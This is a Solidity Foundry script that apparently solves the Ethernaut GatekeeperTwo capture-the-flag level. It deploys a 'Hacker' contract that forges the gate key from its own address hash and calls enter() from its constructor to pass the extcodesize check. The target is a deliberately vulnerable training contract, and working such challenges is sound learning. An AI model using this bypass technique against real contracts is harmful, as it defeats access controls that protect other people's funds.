// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract Hacker {
    constructor(GatekeeperTwo _gateKeeperTwo) {
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;

        bytes8 key = bytes8(k);
        require(_gateKeeperTwo.enter(key), "Failed");
    }
}

contract GatekeeperTwoSolution is Script {
    GatekeeperTwo public instance = GatekeeperTwo(0x4A56AF7506Fdbc3BEEb2B13F464E11f13CE6e14C);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("entrant:", instance.entrant());
        new Hacker(instance);
        console.log("entrant after:", instance.entrant());
        vm.stopBroadcast();
    }
}
